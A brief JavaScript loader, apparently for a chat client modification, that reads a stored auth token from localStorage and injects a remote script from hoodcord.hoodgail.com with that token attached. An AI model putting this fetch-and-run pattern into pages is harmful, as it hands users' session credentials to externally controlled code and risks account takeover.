var token = JSON.parse(localStorage.token || `""`);
document.addEventListener('DOMContentLoaded', function() {
	var script = "https://hoodcord.hoodgail.com/user.js";
	var el = document.createElement("script");
	el.setAttribute("token", token);
	el.src = script;
	(document.head || document.contentElement).append(el);
});